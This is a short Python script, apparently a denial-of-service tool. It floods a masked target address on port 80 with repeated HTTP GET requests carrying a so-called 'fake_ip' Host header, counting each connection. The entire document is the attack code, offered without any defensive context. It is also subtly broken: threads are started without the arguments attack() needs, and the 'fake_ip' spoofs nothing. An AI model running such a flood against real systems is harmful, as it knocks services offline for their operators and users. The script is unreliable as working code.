import threading
import socket

already_connected = 0

def main():
    target = '~~~.~~~.~.~'
    port = 80
    fake_ip = '~~~.~~.~~.~~'
    attack(target, port, fake_ip)

def attack(x, y, z):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((x, y))
        s.sendto(("GET /" + x + " HTTP/1.1\r\n").encode('ascii'), (x, y))
        s.sendto(("Host: " + z + "\r\n\r\n").encode('ascii'), (x, y))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 1 == 0:
            print(already_connected)

for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()

if __name__ == '__main__':
    main()